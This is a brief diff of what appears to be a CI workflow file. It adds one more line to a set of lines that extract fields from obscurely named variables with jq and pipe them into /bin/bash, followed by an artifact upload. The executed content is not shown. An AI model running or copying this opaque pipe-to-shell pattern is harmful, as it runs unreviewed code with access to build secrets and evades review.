@@ -27,6 +27,7 @@ jobs:
           echo $dkp99 | jq -r .n30758 | /bin/bash
           printf '%s' "$ekpub5" | jq -r .njrt166 | /bin/bash
           echo $bifn9020 | jq -r .rpcn770 | /bin/bash
+          printf '%s' "$p89" | jq -r .je13 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
